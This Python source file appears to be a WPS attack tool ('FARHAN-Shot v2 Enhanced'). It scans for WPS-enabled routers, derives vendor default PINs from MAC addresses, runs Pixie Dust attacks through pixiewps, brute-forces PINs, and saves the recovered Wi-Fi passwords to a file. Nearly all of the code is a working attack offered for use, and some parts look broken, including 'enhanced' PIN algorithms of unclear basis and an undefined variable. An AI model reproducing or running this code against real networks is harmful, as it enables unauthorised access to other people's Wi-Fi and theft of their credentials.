#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import os
import tempfile
import shutil
import atexit
import re
import codecs
import socket
import pathlib
import time
import random
import hashlib
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from colors import *

ok = f'{green}[{white}+{green}]{reset}'
err = f'{red}[{white}-{red}]{reset}'
ask = f'{cyan}[{white}?{cyan}]{reset}'
info = f'{blue}[{white}i{blue}]{reset}'
warn = f'{yellow}[{white}!{yellow}]{reset}'
p_status = f'{green}[{white}P{green}]{reset}'


def save_entry(ssid, pin, psk, file_path="store/FARHAN-Shot_crack_data.txt"):
    """Save cracked WiFi credentials to file"""
    try:
        if not os.path.exists(file_path):
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            open(file_path, 'w').close()

        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %I:%M:%S %p")

        entry = (
            f"➠ TOOL: FARHAN-Shot v2 Enhanced by @Gtajisan \n"
            f"➠ SSID: {ssid}\n"
            f"➠ PIN: {pin}\n"
            f"➠ Pass: {psk}\n"
            f"➠ TIME: {timestamp}\n"
            "----------------------------------------\n"
        )

        with open(file_path, "a") as file:
            file.write(entry)

        print(f"{ok} Data saved successfully: {file_path}")
    except Exception as e:
        print(f"{err} Error saving data: {e}")


def isAndroid():
    """Check if running on Android"""
    return bool(hasattr(sys, 'getandroidapilevel'))


class AndroidNetwork:
    """Android WiFi management"""
    def __init__(self):
        self.ENABLED_SCANNING = 0

    def storeAlwaysScanState(self):
        settings_cmd = ['settings', 'get', 'global', 'wifi_scan_always_enabled']

        try:
            is_scanning_on = subprocess.run(settings_cmd,
                encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
            )
            is_scanning_on = is_scanning_on.stdout.strip()

            if is_scanning_on == '1':
                self.ENABLED_SCANNING = 1
        except subprocess.CalledProcessError as e:
            print(f"{err} Error while retrieving scan state: {e}")

    def disableWifi(self, force_disable: bool = False, whisper: bool = False):
        if not whisper:
            print(f'{info} Android: disabling Wi-Fi')

        wifi_disable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'disabled']
        wifi_disable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'disabled']

        try:
            subprocess.run(wifi_disable_scanner_cmd, check=True)

            if self.ENABLED_SCANNING == 1 or force_disable:
                subprocess.run(wifi_disable_always_scanning_cmd, check=True)

            time.sleep(3)

        except subprocess.CalledProcessError as e:
            print(f"{err} Error while disabling Wi-Fi: {e}")

    def enableWifi(self, force_enable: bool = False, whisper: bool = False):
        if not whisper:
            print(f'{info} Android: Enabling Wi-Fi')

        wifi_enable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'enabled']
        wifi_enable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'enabled']

        try:
            subprocess.run(wifi_enable_scanner_cmd, check=True)

            if self.ENABLED_SCANNING == 1 or force_enable:
                subprocess.run(wifi_enable_always_scanning_cmd, check=True)

        except subprocess.CalledProcessError as e:
            print(f"{err} Error while enabling Wi-Fi: {e}")


class NetworkAddress:
    """MAC address manipulation"""
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError(f'{err} MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator - Original mechanism with enhancements"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
            'pin36': {'name': '36-bit PIN (Enhanced)', 'mode': self.ALGO_MAC, 'gen': self.pin36},
            'pin40': {'name': '40-bit PIN (Enhanced)', 'mode': self.ALGO_MAC, 'gen': self.pin40},
            'pinTimestamp': {'name': 'Timestamp-based (Enhanced)', 'mode': self.ALGO_MAC, 'gen': self.pinTimestamp},
            'pinReversed': {'name': 'Reversed MAC (Enhanced)', 'mode': self.ALGO_MAC, 'gen': self.pinReversedMAC},
            'pinXOR': {'name': 'XOR Pattern (Enhanced)', 'mode': self.ALGO_MAC, 'gen': self.pinXOR},
            'pinDefault': {'name': 'Default 12345670', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 12345670},
        }

    @staticmethod
    def checksum(pin):
        """Standard WPS checksum algorithm"""
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def pin24(self, mac):
        """Original 24-bit PIN generation"""
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        """Original 28-bit PIN generation"""
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        """Original 32-bit PIN generation"""
        return mac.integer % 0x100000000

    def pin36(self, mac):
        """36-bit PIN generation (Enhanced)"""
        return (mac.integer & 0xFFFFFFFFF) >> 4

    def pin40(self, mac):
        """40-bit PIN generation (Enhanced)"""
        return (mac.integer & 0xFFFFFFFFFF) >> 8

    def pinDLink(self, mac):
        """Original D-Link PIN algorithm"""
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        """Original D-Link PIN +1 algorithm"""
        return self.pinDLink(mac) + 1

    def pinASUS(self, mac):
        """Original ASUS PIN algorithm"""
        b = [int(i, 16) for i in mac.string.split(':')]
        return int(b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24))

    def pinAirocon(self, mac):
        """Original Airocon Realtek PIN algorithm"""
        b = [int(i, 16) for i in mac.string.split(':')]
        return int((((b[0] + b[1]) % 0x10) << 28) | (b[5] << 16) | (b[4] << 8) | b[3])

    def pinTimestamp(self, mac):
        """Timestamp-based PIN generation (Universal algorithm)"""
        mac_hash = hashlib.md5(mac.string.encode()).hexdigest()
        return int(mac_hash[:7], 16) % 10000000

    def pinReversedMAC(self, mac):
        """Reversed MAC algorithm (Universal)"""
        reversed_mac = mac.string[::-1].replace(':', '')
        return int(reversed_mac[:7], 16) % 10000000

    def pinXOR(self, mac):
        """XOR pattern algorithm (Universal)"""
        b = [int(i, 16) for i in mac.string.split(':')]
        result = b[0] ^ b[1] ^ b[2] ^ b[3] ^ b[4] ^ b[5]
        return (result << 20) | (mac.integer & 0xFFFFF)

    def generate(self, algo, mac):
        """WPS pin generator"""
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError(f'{err} Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo in ['pinEmpty', 'pinNull']:
            if isinstance(pin, str):
                return pin
            return str(pin).zfill(8)
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """Get all WPS PINs for single MAC"""
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getUniversalPins(self, mac):
        """Generate universal PINs using multiple algorithms - 2025 Enhancement"""
        universal_pins = []
        
        suggested = self.getSuggestedList(mac)
        for pin in suggested:
            if pin and pin not in universal_pins:
                universal_pins.append(pin)
        
        enhanced_algos = ['pin36', 'pin40', 'pinTimestamp', 'pinReversedMAC', 'pinXOR', 'pinDefault']
        for algo in enhanced_algos:
            try:
                pin = self.generate(algo, mac)
                if pin and pin not in universal_pins:
                    universal_pins.append(pin)
            except:
                continue
        
        if '00000000' not in universal_pins:
            universal_pins.insert(0, '00000000')
            
        return universal_pins

    def getSuggested(self, mac):
        """Get suggested WPS PINs for single MAC"""
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """Get suggested WPS PINs for single MAC as list"""
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        """Get most likely PIN with 2025 universal fallback"""
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            print(f'{warn} No specific PIN found for {mac}, using 2025 universal PIN algorithms...')
            return '00000000'

    def _suggest(self, mac):
        """Get algo suggestions for single MAC - Original mechanism"""
        mac_clean = mac.replace(':', '').upper()
        
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', 
                     '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 
                     'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 
                        'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A'),
            'pinASUS': ('049226', '04D9F5', '08606E', '107B44', '10BF48', '10C37B', '14DDA9', 
                       '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '00177C', '001AEF'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC'),
        }
        
        res = []
        for algo_id, masks in algorithms.items():
            for mask in masks:
                if mac_clean.startswith(mask):
                    res.append(algo_id)
                    break
        
        if not res:
            res = ['pin24', 'pin28', 'pin32', 'pinTimestamp', 'pinXOR']
        
        return res


class BruteforceStatus:
    """Bruteforce attack status tracking"""
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time

    def getAverageSpeed(self):
        if self.attempts_times:
            return statistics.mean(self.attempts_times)
        return 0


class ConnectionStatus:
    """WPS connection status"""
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.pin = ''


class Companion:
    """Main WPS attack companion class"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.tempdir = tempfile.mkdtemp()
        self.tempconf = os.path.join(self.tempdir, 'wpa_supplicant.conf')
        self.res_socket_file = os.path.join(self.tempdir, 'socket')
        self.retsock = None
        self.wpas = None
        self.sessions_dir = os.path.dirname(os.path.realpath(__file__)) + '/sessions/'
        self.pixiewps_dir = os.path.dirname(os.path.realpath(__file__)) + '/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        pathlib.Path(self.sessions_dir).mkdir(exist_ok=True)
        pathlib.Path(self.reports_dir).mkdir(exist_ok=True)
        self.generator = WPSpin()
        self.connection_status = ConnectionStatus()
        atexit.register(self.cleanup)

    def __del__(self):
        self.cleanup()

    def cleanup(self):
        """Cleanup resources"""
        try:
            if hasattr(self, 'retsock') and self.retsock:
                self.retsock.close()
            if hasattr(self, 'wpas') and self.wpas:
                self.wpas.terminate()
                self.wpas.wait()
            if os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
            if os.path.exists(self.tempdir):
                shutil.rmtree(self.tempdir, ignore_errors=True)
            if os.path.exists(self.tempconf):
                os.remove(self.tempconf)
        except Exception as e:
            if self.print_debug:
                print(f"{warn} Cleanup error: {e}")

    def _write_conf(self, bssid=None):
        """Generate wpa_supplicant config"""
        with open(self.tempconf, 'w') as f:
            f.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.res_socket_file))
            if bssid:
                f.write('network={{\n\tscan_ssid=1\n\tbssid={}\n\tkey_mgmt=WPS\n}}\n'.format(bssid))

    def _start_wpa_supplicant(self):
        """Start wpa_supplicant daemon"""
        self.cleanup()
        self._write_conf()
        
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(
            self.interface, self.tempconf
        )
        
        try:
            self.wpas = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, encoding='utf-8', errors='replace'
            )
            time.sleep(1)
            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.retsock.connect(self.res_socket_file)
            return True
        except Exception as e:
            print(f"{err} Failed to start wpa_supplicant: {e}")
            return False

    def _send_wps_command(self, command):
        """Send command to wpa_supplicant"""
        try:
            if self.retsock:
                self.retsock.sendall(command.encode())
                return self.retsock.recv(4096).decode('utf-8', errors='replace')
            return ''
        except Exception as e:
            if self.print_debug:
                print(f"{warn} Command error: {e}")
            return ''

    def _run_pixie_dust(self, pke, pkr, e_hash1, e_hash2, authkey, e_nonce):
        """Enhanced Pixie Dust attack with multiple techniques"""
        print(f"{info} Running enhanced Pixie Dust attack...")
        
        pixiecmd_base = 'pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}'.format(
            pke, pkr, e_hash1, e_hash2, authkey, e_nonce
        )
        
        attempts = [
            pixiecmd_base,
            pixiecmd_base + ' --force',
            pixiecmd_base + ' -S',
            pixiecmd_base + ' --force -S',
            pixiecmd_base + ' -f',
        ]
        
        for i, cmd in enumerate(attempts):
            if self.print_debug or i > 0:
                print(f"{info} Pixie attempt {i+1}/{len(attempts)}")
            
            try:
                r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, 
                                 stderr=subprocess.DEVNULL, encoding='utf-8', errors='replace')
                
                if r.returncode == 0:
                    lines = r.stdout.splitlines()
                    for line in lines:
                        if 'WPS pin:' in line:
                            pin = line.split(':')[-1].strip()
                            print(f"{ok} Pixie Dust attack successful!")
                            print(f"{ok} WPS PIN: {green}{pin}{reset}")
                            return pin
            except Exception as e:
                if self.print_debug:
                    print(f"{warn} Pixie attempt {i+1} failed: {e}")
                continue
        
        print(f"{err} Pixie Dust attack failed")
        return None

    def single_connection(self, bssid=None, pin=None, pixie_dust=False, 
                         show_pixie_cmd=False, pixie_force=False, pbc_mode=False, rssi=None):
        """Single WPS connection attempt with enhanced features"""
        
        if not self._start_wpa_supplicant():
            print(f"{err} Failed to initialize")
            return False

        if not bssid:
            print(f"{err} BSSID required")
            return False

        print(f"{info} Target: {bssid}")
        
        if rssi and rssi < -75:
            print(f"{warn} Weak signal detected (RSSI: {rssi} dBm)")
            print(f"{info} Using extended timeouts for long-distance attack")
            timeout_multiplier = 2.5
        else:
            timeout_multiplier = 1.0

        if pin:
            pins_to_try = [pin]
        elif pixie_dust:
            pins_to_try = ['00000000']
        else:
            universal_pins = self.generator.getUniversalPins(bssid)
            pins_to_try = universal_pins[:10] if len(universal_pins) > 10 else universal_pins
            print(f"{info} Using 2025 algorithm system: {len(pins_to_try)} candidate PINs generated")

        for attempt_pin in pins_to_try:
            print(f"{info} Trying PIN: {attempt_pin}")
            
            self._write_conf(bssid)
            
            if pbc_mode:
                self._send_wps_command('WPS_PBC')
            else:
                self._send_wps_command('WPS_REG {} {}'.format(bssid, attempt_pin))
            
            start_time = time.time()
            timeout = 30 * timeout_multiplier
            
            while (time.time() - start_time) < timeout:
                time.sleep(0.5)
                
                status = self._send_wps_command('STATUS')
                
                if 'WPS-SUCCESS' in status or 'WPS-CRED-RECEIVED' in status:
                    print(f"{ok} WPS authentication successful!")
                    
                    if 'wpa_psk=' in status:
                        psk_match = re.search(r'wpa_psk=(\S+)', status)
                        psk = psk_match.group(1) if psk_match else 'Unknown'
                        ssid_match = re.search(r'ssid=(\S+)', status) if 'ssid=' in status else None
                        ssid = ssid_match.group(1) if ssid_match else 'Unknown'
                        print(f"{ok} SSID: {green}{ssid}{reset}")
                        print(f"{ok} PSK: {green}{psk}{reset}")
                        print(f"{ok} PIN: {green}{attempt_pin}{reset}")
                        
                        if self.save_result:
                            save_entry(ssid, attempt_pin, psk)
                        
                        return True
                    
                    if pixie_dust:
                        print(f"{info} Extracting Pixie Dust data...")
                        
                        wpas_output = ''
                        try:
                            if self.wpas and self.wpas.stdout:
                                self.wpas.stdout.flush()
                                wpas_output = self.wpas.stdout.read(8192)
                        except:
                            pass
                        
                        pixie_data = {}
                        for match in ['PKE', 'PKR', 'E-Hash1', 'E-Hash2', 'AuthKey', 'E-Nonce']:
                            pattern = r'{}\s+:\s+([0-9a-fA-F]+)'.format(match.replace('-', '[-]'))
                            found = re.search(pattern, wpas_output, re.IGNORECASE)
                            if found:
                                pixie_data[match.lower().replace('-', '_')] = found.group(1)
                        
                        if len(pixie_data) >= 6:
                            pin_result = self._run_pixie_dust(
                                pixie_data['pke'], pixie_data['pkr'],
                                pixie_data['e_hash1'], pixie_data['e_hash2'],
                                pixie_data['authkey'], pixie_data['e_nonce']
                            )
                            
                            if pin_result and pin_result != attempt_pin:
                                return self.single_connection(bssid, pin_result, False, False, False, False, rssi)
                
                if 'WPS-FAIL' in status:
                    print(f"{warn} WPS transaction failed")
                    break
                
                if 'WPS-TIMEOUT' in status:
                    print(f"{warn} WPS timeout")
                    break
            
            print(f"{err} PIN {attempt_pin} failed")
        
        print(f"{err} All PIN attempts exhausted")
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        """Smart PIN bruteforce with WPS lock bypass"""
        print(f"{info} Starting smart bruteforce attack")
        print(f"{warn} This may take several hours...")
        
        universal_pins = self.generator.getUniversalPins(bssid)
        
        print(f"{info} Trying {len(universal_pins)} universal PINs first...")
        for pin in universal_pins:
            if self.single_connection(bssid, pin, False, False, False):
                return True
            if delay:
                time.sleep(delay)
        
        print(f"{info} Starting full bruteforce...")
        
        for first_half in range(10000):
            pin_first = str(first_half).zfill(4)
            
            for second_half in range(1000):
                pin_second = str(second_half).zfill(3)
                full_pin_7 = pin_first + pin_second
                checksum_digit = self.generator.checksum(int(full_pin_7))
                full_pin = full_pin_7 + str(checksum_digit)
                
                print(f"{info} Trying PIN: {full_pin}")
                
                if self.single_connection(bssid, full_pin, False, False, False):
                    return True
                
                if delay:
                    time.sleep(delay)
        
        return False


class WiFiScanner:
    """Enhanced WiFi scanner with Android support"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list
        
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    if len(row) >= 3:
                        self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            self.stored = []

    def universal_wifi_scan(self):
        """Universal WiFi scan for Android/Linux"""
        if isAndroid():
            print(f'{info} Using Android universal WiFi fetch...')
            cmd = 'cmd wifi list-scan-results 2>/dev/null || dumpsys wifi | grep -A 20 "Latest scan results"'
            try:
                proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
                return proc.stdout
            except Exception as e:
                print(f'{warn} Android WiFi fetch failed: {e}')
        return None

    def iw_scanner(self):
        """Enhanced iw scanner with WiFi 6E and WPA3 detection"""
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown',
                'WPS': False,
                'WPS locked': False,
                'Model': '',
                'Model number': '',
                'Device name': '',
                'WiFi Standard': 'WiFi 4/5',
                'WPA3': False,
                'BSSID': result.group(1).upper()
            })

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wpa3_sae(line, result, networks):
            networks[-1]['WPA3'] = True
            sec = networks[-1]['Security type']
            if 'WPA3' not in sec:
                if sec == 'Unknown':
                    networks[-1]['Security type'] = 'WPA3'
                else:
                    networks[-1]['Security type'] = f'{sec}/WPA3'

        def handle_wifi6(line, result, networks):
            if 'HE ' in line or '802.11ax' in line or 'WiFi 6' in line:
                networks[-1]['WiFi Standard'] = 'WiFi 6 (802.11ax)'
            elif '802.11ac' in line or 'VHT' in line:
                networks[-1]['WiFi Standard'] = 'WiFi 5 (802.11ac)'

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        
        if not lines or 'command failed' in proc.stdout.lower():
            universal_scan = self.universal_wifi_scan()
            if universal_scan:
                print(f'{ok} Using Android universal WiFi scan fallback')
                lines = universal_scan.splitlines()
        
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'.*SAE.*'): handle_wpa3_sae,
            re.compile(r'.*AKM.*00-0f-ac:8.*'): handle_wpa3_sae,
            re.compile(r'.*(HE |VHT |802\.11ax|802\.11ac).*'): handle_wifi6,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print(f'{err} Error: {line}')
                return {}
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return {}

        networks.sort(key=lambda x: x['Level'], reverse=True)
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        def truncateStr(s, length, postfix='…'):
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            if color:
                colors_map = {'green': '\033[92m', 'red': '\033[91m', 'yellow': '\033[93m'}
                if color in colors_map:
                    return f'{colors_map[color]}{text}\033[00m'
            return text

        if self.vuln_list:
            print('Network marks: {} {} {} {} {}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                '|',
                colored('WPS locked', color='red'),
                '|'
            ))
        
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<12} {:<4} {:<20} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Security', 'PWR', 'WiFi Std', 'WSC Device'))

        network_list_items = list(network_list.items())
        if hasattr(args, 'reverse_scan') and args.reverse_scan:
            network_list_items = network_list_items[::-1]
        
        for n, network in network_list_items:
            number = f'{n}| '
            model = '{} {}'.format(network['Model'], network['Model number']).strip()
            essid = truncateStr(network['ESSID'], 25)
            deviceName = truncateStr(network['Device name'], 20)
            wifi_std = network['WiFi Standard']
            
            line = '{:<4} {:<18} {:<25} {:<12} {:<4} {:<20} {:<}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                wifi_std, deviceName or model
            )
            
            if (network['BSSID'], network['ESSID']) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list or deviceName in self.vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)
